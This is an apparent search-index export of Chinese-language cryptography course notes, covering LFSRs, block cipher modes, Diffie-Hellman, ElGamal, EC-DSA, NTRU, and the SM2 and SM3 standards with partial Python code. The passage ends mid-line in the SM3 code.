\u0026amp;* x^{3}\\\\(c + 1) \u0026amp;* x^{2}\\\\(c^7 + c^6 + c^4 + c^3 + c^2 + 1) \u0026amp;* x^{1}\\\\(c^7 + c^5 + 1) \u0026amp;* x^{0} \\end{bmatrix} \\odot\t\\begin{bmatrix} ac \u0026amp;* x^{3}\\\\0 \u0026amp;* x^{2}\\\\f0 \u0026amp;* x^{1}\\\\2d \u0026amp;* x^{0} \\end{bmatrix} \\begin{bmatrix} (c^7 + c^5 + c^3 + c^2) \u0026amp;* x^{3}\\\\(0) \u0026amp;* x^{2}\\\\(c^7 + c^6 + c^5 + c^4) \u0026amp;* x^{1}\\\\(c^5 + c^3 + c^2 + 1) \u0026amp;* x^{0} \\end{bmatrix} =\t\\begin{bmatrix} 72 \u0026amp;* x^{3}\\\\12 \u0026amp;* x^{2}\\\\5a \u0026amp;* x^{1}\\\\18 \u0026amp;* x^{0} \\end{bmatrix} \\begin{bmatrix} (c^6 + c^5 + c^4 + c) \u0026amp;* x^{3}\\\\(c^4 + c) \u0026amp;* x^{2}\\\\(c^6 + c^4 + c^3 + c) \u0026amp;* x^{1}\\\\(c^4 + c^3) \u0026amp;* x^{0} \\end{bmatrix} mod\tx^4 + 1 "},{"id":113,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/summary/","title":"Summary","section":"密码学","content":"密码学期末复习 #  随机数发生器 #  重点：线性反馈移位寄存器、转移矩阵、特征多项式、m-序列、Golomb 伪随机性\nGolomb 随机性公设：\n GF(2) 上的 n 长 m-sequence {ai} 应该满足下面的三个条件：  在一个周期内，0、1 出现的次数分别是 $$2^{n-1} - 1$$ 和 $$2^{n - 1}$$； 在一个周期内，总游程数为 $$2^{n-1}$$；对长为 $$i (1 \\le i \\le n-1)$$ 的游程有 $$2^{n-1-i}$$ 个，0、1 各半； $${a_i}$$ 的自相关函数为 $$\\displaystyle R(\\tau) = \\begin{cases} 1, \u0026amp; \\tau = 0 \\\\displaystyle -\\frac{1}{2^n - 1}, \u0026amp; 0 \u0026lt; \\tau \\le 2^n - 2 \\end{cases}$$    自相关函数：\n GF(2) 上周期为 T 的序列 $${a_i}$$ 的自相关函数定义为： $$\\displaystyle R(\\tau) = \\frac{1}{T} \\sum_{k = 1}^{T} (-1)^{a_k} (-1)^{a_{k+\\tau}}$$  流密码 #  流密码的加密原理：将明文比特流 m 与随机比特流 k 按位异或得到加密比特流 c；\n随机比特流通常是由多个 LFSR，通过一些方式组合而成：\n Geffe 序列生成器、JK 触发器、Pless 触发器、钟控序列生成器  一些常见的流密码：\n 手机通信的加密方式 A5/1、蓝牙的加密方式 E0、WiFi-WEP 的加密方式 RC4；  分组密码 #  分组密码常用的方法：\n 代换：一个离散可逆函数； 扩散和混淆：香农提出的密码设计两个基本方法。扩散破坏明文和密文的统计关系，混淆破坏密钥和密文的统计关系； Feistel 加密结构：  将明文分为 L、R 左右两个部分，进行多轮迭代计算。每轮计算通过下面的方式： $$L_i = R_{i-1}$$、$$R_i = L_{i-1} \\oplus F(R_{i-1}, K_i)$$    分组密码的运行模式：\n ECB(Electronic Code Book)：电子密码本模式； CBC(Cipher Block Chaining)：密码分组链接模式； CFB(Cipher FeedBack)：密码反馈模式； OFB(Ouput FeedBack)：输出反馈模式；  一些常见的分组密码：\n DES(Data Encryption Standard)：由 IBM 公司研制，最初是 Luciffer 密码的发展和修改； IDEA(International Data Encryption Algorithm)：由 X.J.Lai 与 J.L.Massey 提出，当时被称为 PES(Proposed Encryption Standard)；在差分密码分析提出之后又改进为 IPES，最后更名为 IDEA； AES(Advanced Encryption Standard)：多个机构提出、攻击、选举的结果，最初名为 Rijndael； 祖冲之密码（ZUC）：国家信息安全重点实验室研制，2011 年 9 月成为 LTE 4G 国际标准； SM4：中国商用密码算法，用于 WEPI 的分组密码算法；  公钥密码 #  常见的公钥密码：\n RSA 算法、背包密码体制、Robin 密码体制、ElGamal 椭圆曲线密码体制、SM2 椭圆曲线加密算法；  椭圆曲线上的加法和倍乘运算：\n  对于椭圆曲线 $$E_p(a, b): y^2 \\equiv x^3 +ax +b \\pmod{p}$$。设 $$P_1 = (x_1, y_1), P_2 = (x_2, y_2)$$ 是上异于无穷远点 O 的两个点。则：\n负元公式：$$-P_1 = (x_1, y_1)$$\n加法公式：考虑 $$P_3 = (x_3, y_3) = P_1 + P_2$$：\n 可得 $$\\begin{cases} x_3 = k^2 -x_1 - x_2 \\ y_3 = k(x_1 - x_3) - y_1\\end{cases}$$，其中 $$k = \\begin{cases}\\displaystyle \\frac{y_2 - y_1}{x_2 - x_1} \u0026amp; x_1 \\not= x_2 \\ \\displaystyle \\frac{3x_1^2 + a}{2y_1} \u0026amp; x_1 = x_2\\end{cases}$$    密码分配 #  公钥的分配方式有以下几种：\n 公开发布、公用目录表、公钥管理机构、公钥证书；  秘密分割：\n Shamir 门限方案、基于中国剩余定理的门限方案；  "},{"id":114,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/diffiehellman/","title":"Diffie Hellman","section":"公钥密码体制","content":"Diffie Hellman Key Exchange #  DH：DH 密钥交换用于在公开信道上共享私密信息\n算法的流程 #  系统参数 #  系统的运行需要确定以下两个参数：\n 一个大素数 p； 一个整数 g；  信息生成 #  进行信息交换的双方需要确定以下的信息：\n 双方分别生成两个秘密信息 $$X_A, X_B$$ 通过秘密信息与整数 g 计算：$$g^{X_A}, g^{X_B}$$  秘密共享 #  收到公开信道的信息的双方进行以下操作：\n A 计算得到秘密共享信息：$$s = (g^{X_B})^{X_A} = g^{X_AX_B}$$ B 计算得到秘密共享信息：$$s = (g^{X_A})^{X_B} = g^{X_AX_B}$$  流程图 #  "},{"id":115,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/elgamal/","title":"El Gamal","section":"公钥密码体制","content":" 参考：\n https://resources.saylor.org/wwwresources/archived/site/wp-content/uploads/2011/03/ElGamal-signature-scheme.pdf   ElGamal signature scheme #  算法的流程 #  系统参数 #  系统需要一下在各个使用这个系统的使用者之间共享三个信息：\n H 是一个抗碰撞的哈希函数； p 是一个大素数，解决 p 的离散对数问题是困难的。 g 是在乘法群 $$\\Z^*_p$$ 中随机选取的生成元。  密钥生成 #  签名者需要通过这个系统对一个消息进行签名，需要生成以下的信息：\n 随机选取的整数 x 满足 $$1 \u0026lt; x \u0026lt; p-1$$ 计算以下信息：$$y \\equiv g^x \\pmod{p}$$ 封装公钥：$$(y)$$；封装私钥 $$(x)$$  签名过程 #  签名者通过以下的方式对消息进行签名：\n 随机选取一个整数 k 满足 $$0 \u0026lt; k \u0026lt; p-1 \\and gcd(k, p-1) = 1$$ 计算 $$r = g^k \\pmod{p}$$ 计算 $$s = (H(m) - xr)k^{-1} \\pmod{p-1}$$（即 s 满足 $$H(m) = xr + ks \\pmod{p-1}$$） 如果计算得到 s=0，则重新选取随机数 k。 封装 $$(r, s)$$ 即是拥有私钥 x 的签名者对信息 m 的签名。  验证签名 #  验证一个签名的流程如下：\n 首先需要不等式恒成立 $$0 \u0026lt; r \u0026lt; p \\and 0 \u0026lt; s \u0026lt; p - 1$$ 如果等式 $$g^{H(m)} \\equiv y^r r^s \\pmod{p}$$ 成立，则接受这个签名。  安全性的说明 #  正确性 #  验证签名的办法是正确的。\n通过签名的生成方式我们知道以下的结论：$$H(m) = xr + ks \\pmod{p-1}$$\n通过费马小定理我们可以得到：\n $$g^{H(m)} \\equiv g^{xr}g^{ks} \\equiv y^r r^s \\pmod{p}$$  不可否认性 #  "},{"id":116,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ellipticcurve/","title":"Elliptic Curve","section":"公钥密码体制","content":"Elliptic Curve DSA #  Elliptic Curve #  系统参数 #  如何确定一个 ECC：\n  选择一个素数 p 和一个整数 n。从有限域 $$\\mathbb{F}p$$ 中选择一个次数为 n 不可约多项式 f(x)，并且用这个不可约多项式得到一个有限域 $$\\mathbb{F}{p^n}$$，设 f(x) 在该有限域下的根为 $$\\alpha$$；\n  在有限域 $$\\mathbb{F}_{p^n}$$ 中生成一个非超奇异（non-supersingular）曲线 E；\n  在 E 上选择一个阶为素数的点 $$P=(x,y)$$，设其阶为 q；\n  定义一个转化函数 $$c(x): \\mathbb{F}{p^n} \\rightarrow \\Z{p^n}$$。具体的定义为：\n$$\\displaystyle c(x) = \\sum_{i=0}^{n-1} c_i p^i \\in \\Z_{p^n}, \\text{for } x= \\sum_{i=0}^{n-1}c_i \\alpha^i \\in \\mathbb{F}_{p^n}, 0 \\le c_i \u0026lt; p$$\n  域上的运算 #  DSA 签名算法 #  系统参数 #  系统需要初始化以下信息供所有系统的使用者共享：\n 选择一个椭圆曲线 EC： 选择一个安全的哈希函数 h(x)；  密钥生成 #  签名者使用这个系统需要通过以下方式生成一个密钥：\n 随机选择一个整数 d 满足 $$0 \u0026lt; d \u0026lt; q$$ 在椭圆曲线 E 上计算 $$Q = dP = (x_d, y_d)$$ 封装公钥 $$(x_d, y_d)$$，封装私钥 $$(d)$$  签名过程 #  签名者通过以下的方式进行签名：\n 随机选取一个整数 k 满足 $$0 \u0026lt; k \u0026lt; q$$，并计算 $$R = kP = (x_k, y_k)$$ 通过系统中的函数 c(x) 计算 r，即：$$r = c(x_k)$$ 计算满足以下方程的 s：$$h(m) \\equiv dr + ks \\pmod{q}$$ 封装信息 m 的签名 $$(r, s)$$。  验证签名 #  验证签名的流程如下：\n 计算以下的三个数字：$$\\begin{cases} t = s^{-1} \\pmod{q}\\ u = h(m) \\cdot t \\pmod{q}\\ v = -t \\cdot r \\pmod{q} \\end{cases}$$ 在椭圆曲线中计算下面的点 $$uP + vQ = u(x,y) + v(x_d,y_d)=(x_k, y_k)$$ 判断以下等式是否成立，成立则接受这个签名 $$r = c(x_k) \\pmod{q}$$  "},{"id":117,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/ntru/","title":"Ntru","section":"公钥密码体制","content":" 参考：\n http://people.scs.carleton.ca/~maheshwa/courses/4109/Seminar11/NTRU_presentation.pdf   NTRU Cryptosystem #  NTRU: Nth degree Truncated polynomial Ring Units. Or $$\\displaystyle R = \\frac{Z[X]}{X^{N-1}}$$\n算法的流程 #  系统参数 #  系统需要一下在各个使用这个系统的使用者之间共享三个信息：\n N\u0026amp;R：N 是一个整数、R 是一个环，在环 R 上的多项式次数均为 N-1； p：一个小整数。多项式对 p 系数取模得到一个模环； q：一个与 p 互素的大整数。多项式对 q 系数取模得到一个模环；  密钥生成 #  使用这个系统的用户需要通过一下的方式生成公钥与私钥：\n  从 R 中随机选取两个可逆多项式 f, g；\n  计算 f 关于 p,q 的逆：$$f \\cdot f_p \\equiv 1 \\pmod{p}, f \\cdot f_q \\equiv 1 \\pmod{q}$$\n  计算下面的多项式积：$$h = p \\cdot f_q \\cdot g \\pmod{q}$$\n  封装私钥 $$(f, f_p)$$，封装公钥 $$(h)$$\n  加密流程 #  一个用户 A 得到了 B 的公钥，想向 B 发送一条信息，通过下面的方式：\n 将明文 m 表示为模 p 环多项式的形式，多项式的系数选在区间 $$\\displaystyle (-\\frac{p}{2}, \\frac{p}{2})$$ 之中； 随机选取一个多项式 r； 用以下的方式计算密文：$$e = r \\cdot h + m \\pmod{q}$$；  解密流程 #  B 收到了来自 A 的加密信息将通过以下的方式解密：\n B 私钥中有一个私有的多项式 f，通过以下方式计算多项式 a：$$a \\equiv f \\cdot e \\pmod{q}$$，其中多项式的系数选在区间 $$\\displaystyle (-\\frac{q}{2}, \\frac{q}{2})$$ 之中； 在通过小素数 p 计算：$$b \\equiv a \\pmod{p}$$ 最后使用私钥中的多项式 $$f_p$$ 即可得到明文：$$c \\equiv f_p \\cdot b \\pmod{p}$$  "},{"id":118,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/","title":"工作模式","section":"分组密码体制","content":" 参考：\n https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F#%E5%A1%AB%E5%85%85   分组密码工作模式 #  电子密码本 EBC #   +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +-------|--------+ +-------|---------+ | | v v +-------------------------+ +-------------------------+\rkey----\u0026gt;| block cipher encryption | key----\u0026gt;| block cipher encryption |\r+------------|------------+ +------------|------------+\r| | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ 密码分组连接 CBC #   +----------------+ +-----------------+ | plaintext[0:n] | | plaintext[n:2n] | +--------+-------+ +--------+--------+ | | v v iv-----------------\u0026gt;xor +--------------------\u0026gt;xor | | | v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------|------------+ | +------------|------------+\r| | | v | v +-----------------+ | +------------------+ | ciphertext[0:n] -----+ | ciphertext[n:2n] | +-----------------+ +------------------+ 密码反馈 CFB #   iv | --------------------------+ v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------+------------+ | +------------+------------+\r| | | +----------------+ v | +-----------------+ v | plaintext[0:n] +--\u0026gt;xor | | plaintext[n:2n] +--\u0026gt;xor\r+----------------+ | | +-----------------+ | v | v +-----------------+ | +------------------+ | ciphertext[0:n] +----+ | ciphertext[n:2n] | +-----------------+ +------------------+ 输出反馈 OFB #   iv | --------------------------+ v | v +-------------------------+ | +-------------------------+\rkey----\u0026gt;| block cipher encryption | | key----\u0026gt;| block cipher encryption |\r+------------+------------+ | +------------+------------+\r| | |\r+--------------+ | +----------------+ v +-----------------+ v | plaintext[0:n] +--\u0026gt;xor | plaintext[n:2n] +--\u0026gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ 计数器 CTR #   +----------+----------+ +----------+----------+ | nonce |counter=0 | | nonce |counter=1 | +----------+----------+ +----------+----------+ | | v v +-------------------------+ +-------------------------+\rkey----\u0026gt;| block cipher encryption | key----\u0026gt;| block cipher encryption |\r+------------+------------+ +------------+------------+\r| | +----------------+ v +-----------------+ v | plaintext[0:n] ---\u0026gt;xor | plaintext[n:2n] ---\u0026gt;xor +----------------+ | +-----------------+ | v v +-----------------+ +------------------+ | ciphertext[0:n] | | ciphertext[n:2n] | +-----------------+ +------------------+ "},{"id":119,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm2/","title":"Sm2","section":"国密算法","content":"SM 2 #  有限域 #  本条给出有限域 $$F_q$$ 的描述及其元素的表示，q 是一个奇素数或者是 2 的方幂。\n 当 q 是奇素数 p 时，要求 p \u0026gt; $$2^{191}$$； 当 q 是 2 的方幂 $$2^m$$ 时，要求 m \u0026gt; 192 且为素数。  素域 #  如果是第一种情况，q 是奇素数 p 时，素域 $$F_p$$ 中的元素用 $${0, 1, \\cdots, p-1}$$ 表示。\n这个域有以下的特点：\n  加法单位元是整数 0；\n  乘法单位元是整数 1；\n  域元素加法是整数模 p 加法：$$a, b \\in F_p$$，则 $$a + b \\rightarrow (a+b) \\pmod{p}$$\n  域元素乘法是整数模 p 乘法：$$a, b \\in F_p$$，则 $$ab \\rightarrow ab \\pmod{p}$$\n  二元扩域 #  当 q 是 2 的方幂 $$2^m$$ 时，二元扩域 $$F_{2^m}$$ 可以看成 $$F_2$$ 上的 m 维向量空间，其元素可用长度为 m 的比特串表示。m 上的元素主要有多项式基（PB）与正规基（NB）两种表示方法。下面以前者为例：\n多项式基：\n 设 $$F_2$$ 上的 m 次不可约多项式 $$f(x) = x^m + f_{m-1} x^{m-1} + \\cdots + f_1 x + f_0, \\text{where }f_i \\in F_2$$，则 $$F_{2^m}$$ 由 $$F_2$$ 上所有次数低于 m 的多项式构成。 多项式集合 $${x_{m−1};x_{m−2}; \\cdots ;x;1}$$是 $$F_{2^m}$$ 在 $$F_2$$上的一组基，称为**多项式基**。 $$F_{2^m}$$ 中的任意一个元素 $$a(x) = a_{m−1}x_{m−1} +a_{m−2}x_{m−2} + \\cdots +a_1x+a_0$$ 在 $$F_2$$ 上的系数恰好构成了长度为 m 的比特串，用 $$a = (a_{m−1};a_{m−2}; \\cdots ;a_1;a_0)$$ 表示。  这个域有以下的特点：\n  加法单位元是 $$(\\underbrace{0, \\cdots, 0, 0}_{m})$$；\n  乘法单位元是 $$\\displaystyle (\\underbrace{0, \\cdots, 0}_{m-1}, 1)$$；\n  域元素的加法运算：$$(a_{m−1};\\cdots ; a_0) + (b_{m−1}; \\cdots ;b_0) = (a_{m−1} \\oplus b_{m-1}; \\cdots ;a_0 \\oplus b_0)$$\n  域元素的乘法运算：$$a(x) \\cdot b(x) \\rightarrow a(x) \\cdot b(x) \\pmod{f(x)}$$\n  椭圆曲线 #  有限域 $$F_q$$ 上的椭圆曲线是由点组成的集合。\n在仿射坐标系下，椭圆曲线上点 P（非无穷远点）的坐标表示为 $$P = (x_P;y_P)$$，其中 $$x_P, y_P$$ 为满足一定方程的域元素，分别称为点 P 的 x 坐标和 y 坐标。在本文本中，称 $$F_q$$为基域。\n素域上的椭圆曲线 #  定义在 $$F_p$$ 上的椭圆方程为：\n $$E: y^2 = x^3 + ax + b \\text{ where } a,b \\in F_p, 4a^3 +27b^2 \\not\\equiv 0 \\pmod{p}$$  椭圆曲线 $$E(F_p)$$ 定义为：\n $$E(F_p) = {(x, y) | x,y \\in F_p, (x,y) \\in E} \\cup{O}$$，其中 O 是无穷远点。  椭圆曲线上的点的数目记作椭圆曲线的阶。\n素域上的椭圆曲线群 #  椭圆曲线 $$E(F_p)$$ 上的点，按照下面的运算规则，构成一个交换群：\n  $$\\forall P = (x,y) \\in E(F_p)$$，P 的逆元 $$-P = (x, -y)$$，$$P + (-P) = O$$\n  两个非逆不相同点相加的规则：\n  设 $$P_1, P_2 = (x_1, y_1), (x_2, y_2) \\in E(F_p) \\backslash {O}, \\text{where } x_1 \\not= x_2$$\n  设 $$P_3 = P_1 + P_2 = (x_3, y_3)$$，则：$$\\displaystyle \\begin{cases}x_3 = \\lambda^2 - x_1 - x_2 \\ y_3 = \\lambda (x_1 - x_3) - y_1\\end{cases}$$，其中 $$\\displaystyle \\lambda = \\frac{y_2 - y_1}{x_2 - x_1}$$\n    倍加规则：\n 设 $$P_0 = (x_0, y_0) \\in E(F_p) \\backslash {O}, \\text{where } y_0 \\not= 0$$ 设 $$P_1 = P_0 +P_0 = (x_1, y_1)$$，则：$$\\displaystyle \\begin{cases}x_1 = \\lambda^2 - 2x_0 \\ y_1 = \\lambda(x_0 - x_1) - y_0\\end{cases}$$，其中 $$\\displaystyle \\lambda = \\frac{3 x_0^2 + a}{2y_0}$$    二元扩域上的椭圆曲线 #  定义在 $$F_{2^m}$$ 上的椭圆方程为：\n $$E: y^2 + xy = x^3 + ax^2 + b \\text{ where } a,b \\in F_{2^m}, b \\not= 0$$  椭圆曲线 $$E(F_{2^m})$$ 定义为：\n $$E(F_{2^m}) = {(x,y) | x,y \\in F_{2^m}, (x,y) \\in E} \\cup {O}$$，其中 O 是无穷远点。  椭圆曲线上的点的数目记作椭圆曲线的阶。\n二元扩域上的椭圆曲线群 #  椭圆曲线 $$E(F_{2^m})$$ 上的点，按照下面的运算规则，构成一个交换群：\n  $$\\forall P = (x,y) \\in E(F_p)$$，P 的逆元 $$-P = (x, x+y)$$，$$P + (-P) = O$$\n  两个非逆不相同点相加的规则：\n 设 $$P_1, P_2 = (x_1, y_1), (x_2, y_2) \\in E(F_{2^m}) \\backslash {O}, \\text{where } x_1 \\not= x_2$$ 设 $$P_3 = P_1 + P_2 = (x_3, y_3)$$，则：$$\\displaystyle \\begin{cases} x_3 = \\lambda^2 + \\lambda + x_1 + x_2 + a \\ y_3 = \\lambda (x_1 + x_3) + x_3 + y_1 \\end{cases}$$，其中 $$\\displaystyle \\lambda = \\frac{y_1 + y_2}{x_1 + x_2}$$    倍加规则：\n 设 $$P_0 = (x_0, y_0) \\in E(F_{2^m}) \\backslash {O}, \\text{where } y_0 \\not= 0$$ 设 $$P_1 = P_0 +P_0 = (x_1, y_1)$$，则：$$\\displaystyle \\begin{cases}x_1 = \\lambda^2 + \\lambda + a \\ y_1 = x_0^2 + (\\lambda + 1)x_0\\end{cases}$$，其中：$$\\displaystyle \\lambda = x_1 + \\frac{y_1}{x_1}$$    数据类型及转换 #  数据类型 #  下面列举算法中会用到的所有数据类型：\n  比特串：有序的 0 和 1 的序列。\n  字节串：有序的字节序列，其中 8 比特为 1 个字节。\n  域元素：有限域 $$F_q$$ 中的元素。\n  椭圆曲线上的点：椭圆曲线的点有很多表示方式，但是所有的表示方式都可以表示为三个部分：\n\u0026lt;PC\u0026gt; || \u0026lt;点横坐标表示为字符串\u0026gt; || \u0026lt;点的纵坐标表示为字符串\u0026gt;\r其中 PC 用于表示域元素表示为字符串的方式：\n 如果是使用压缩形式表示，PC = 02 或 03； 如果是使用未压缩形式表示，PC = 04； 如果是使用混合形式表示，PC = 06 或 07。    参数以及验证 #  素域系统参数 #  $$F_p$$ 的系统参数主要有以下的几个：\n 域的规模 p 是一个大于 3 的素数； 一个长度至少为 192 的比特串 SEED； $$F_p$$ 中的两个元素 a 与 b，它们定义了椭圆曲线的方程：$$y^2 = x^3 + ax + b$$ 基点 $$G = (x_G, y_G) \\in E(F_p) \\backslash {O}$$； 基点 G 的阶 n，n 需要满足 $$n \u0026gt; 2^{191}, n \u0026gt; 4 p^{\\frac{1}{2}}$$； 余因子 $$\\displaystyle h = \\frac{#E(F_p)}{n}$$；  除此之外，还应该进行以下的几步对系统参数进行合理性验证（此处已经略去在生成过程中已经指明的条件）：\n 验证 $$4a^3 +27b^2 \\not= 0 \\pmod{p}$$； 计算 $$\\displaystyle h' = [\\frac{(p^2 + 1)^2}{n}]$$，并验证 $$h' = h$$； 抗 MOV 攻击和抗异常曲线攻击成立。  二元扩域系统参数 #  $$F_{2^m}$$ 上的系统参数主要有以下的几个：\n 域的规模 $$2^m$$，以及指定一个域中元素的表示方法； 一个长度至少为 192 的比特串 SEED； $$F_{2^m}$$ 中的两个元素 a 与 b，它们定义了椭圆曲线的方程：$$y^2 + xy = x^3 + ax^2 + b$$ 基点 $$G = (x_G, y_G) \\in E(F_{2^m}) \\backslash {O}$$； 基点 G 的阶 n，n 需要满足 $$n \u0026gt; 2^{191}, n \u0026gt; 2^{2 + \\frac{m}{2}}$$； 余因子 $$\\displaystyle h = \\frac{#E(F_p)}{n}$$；  除此之外，同样也应该进行以下的几步对系统参数进行合理性验证：\n 通过域中元素表示方式进行验证：  若所用的是 TPB，则验证约化多项式是 $$F_2$$ 上的不可约三项式； 若所用的是 PPB，则验证不存在 m 次不可约三项式，且约化多项式是 $$F_2$$ 上的不可约五 项式； 若所用的是 GNB，则验证m不能被8整除；   验证 $$b \\not= 0$$； 计算 $$\\displaystyle h' = [\\frac{(m^{\\frac{m}{2}} + 1)^2}{n}]$$，并验证 $$h' = h$$； 抗 MOV 攻击条件成立；  密钥对 #  对于已经得到的一个椭圆曲线 $$E(F_q)$$，经过需要进行以下计算：\n 产生随机整数 $$d \\in [1, n-2]$$； G 为基点，计算 $$P = (x_P, y_P) = [d]G$$； 得到密钥对是 $$(d, P)$$，前者是私钥，后者是公钥。  对于生成的密钥对，我们需要对公钥进行验证：\n 首先需要验证 P 不为无穷远点 O； 验证 P 是否满足椭圆曲线方程，P 坐标是否在素域上； 验证 $$[n]P = O$$；  推荐参数 #  推荐使用素数域256位椭圆曲线。椭圆曲线方程：$$y^2 = x^3 + ax + b$$。\n曲线参数：\np=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 00000000 FFFFFFFF FFFFFFFF\ra=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF 00000000 FFFFFFFF FFFFFFFC\rb=28E9FA9E 9D9F5E34 4D5A9E4B CF6509A7 F39789F5 15AB8F92 DDBCBD41 4D940E93\rn=FFFFFFFE FFFFFFFF FFFFFFFF FFFFFFFF 7203DF6B 21C6052B 53BBF409 39D54123\rGx=32C4AE2C 1F198119 5F990446 6A39C994 8FE30BBF F2660BE1 715A4589 334C74C7\rGy=BC3736A2 F4F6779C 59BDCEE3 6B692153 D0A9877C C62A4740 02DF32E5 2139F0A0\r"},{"id":120,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm3/","title":"Sm3","section":"国密算法","content":"SM 3 #  直接上代码（github）：\nimport binascii from math import ceil from .func import rotl, bytes_to_list IV = [ 1937774191, 1226093241, 388252375, 3666478592, 2842636476, 372324522, 3817729613, 2969243214, ] T_j = [ 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2043430169, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042, 2055708042 ] def sm3_ff_j(x, y, z, j): if 0 \u0026lt;= j and j \u0026lt; 16: ret = x ^ y ^ z elif 16 \u0026lt;= j and j \u0026lt; 64: ret = (x \u0026amp; y) | (x \u0026amp; z) | (y \u0026amp; z) return ret def sm3_gg_j(x, y, z, j): if 0 \u0026lt;= j and j \u0026lt; 16: ret = x ^ y ^ z elif 16 \u0026lt;= j and j \u0026lt; 64: #ret = (X | Y) \u0026amp; ((2 ** 32 - 1 - X) | Z) ret = (x \u0026amp; y) | ((~ x) \u0026amp; z) return ret def sm3_p_0(x): return x ^ (rotl(x, 9 % 32)) ^ (rotl(x, 17 % 32)) def sm3_p_1(x): return x ^ (rotl(x, 15 % 32)) ^ (rotl(x, 23 % 32)) def sm3_cf(v_i, b_i): w = [] for i in range(16): weight = 0x1000000 data = 0 for k in range(i*4,(i+1)*4): data = data + b_i[k]*weight weight = int(weight/0x100) w.append(data) for j in range(16, 68): w.append(0) w[j] = sm3_p_1(w[j-16] ^ w[j-9] ^ (rotl(w[j-3], 15 % 32))) ^ (rotl(w[j-13], 7 % 32)) ^ w[j-6] str1 = \u0026#34;%08x\u0026#34; % w[j] w_1 = [] for j in range(0, 64): w_1.append(0) w_1[j] = w[j] ^ w[j+4] str1 = \u0026#34;%08x\u0026#34; % w_1[j] a, b, c, d, e, f, g, h = v_i for j in range(0, 64): ss_1 = rotl( ((rotl(a, 12 % 32)) + e + (rotl(T_j[j], j % 32))) \u0026amp; 0xffffffff, 7 % 32 ) ss_2 = ss_1 ^ (rotl(a, 12 % 32)) tt_1 = (sm3_ff_j(a, b, c, j) + d + ss_2 + w_1[j]) \u0026amp; 0xffffffff tt_2 = (sm3_gg_j(e, f, g, j) + h + ss_1 + w[j]) \u0026amp; 0xffffffff d = c c = rotl(b, 9 % 32) b = a a = tt_1 h = g g = rotl(f, 19 % 32) f = e e = sm3_p_0(tt_2) a, b, c, d, e, f, g, h = map( lambda x:x \u0026amp; 0xFFFFFFFF ,[a, b, c, d, e, f, g, h]) v_j = [a, b, c, d, e, f, g, h] return [v_j[i] ^ v_i[i] for i in range(8)] def sm3_hash(msg): # print(msg) len1 = len(msg) reserve1 = len1 % 64 msg.append(0x80) reserve1 = reserve1 + 1 # 56-64, add 64 byte range_end = 56 if reserve1 \u0026gt; range_end: range_end = range_end + 64 for i in range(reserve1, range_end): msg.append(0x00) bit_length = (len1) * 8 bit_length_str = [bit_length % 0x100] for i in range(7): bit_length = int(bit_length / 0x100) bit_length_str.append(bit_length % 0x100) for i in range(8): msg.append(bit_length_str[7-i]) group_count = round(len(msg) / 64) B = [] for i in range(0, group_count): B.append(msg[i*64:(i+1)*64]) V = [] V.append(IV) for i in range(0, group_count): V.append(sm3_cf(V[i], B[i])) y = V[i+1] result = \u0026#34;\u0026#34; for i in y: result = \u0026#39;%s%08x\u0026#39; % (result, i) return result def sm3_kdf(z, klen): # z为16进制表示的比特串（str），klen为密钥长度（单位byte） klen = int(klen) ct = 0x00000001 rcnt = ceil(klen/32) zin = [i for i in 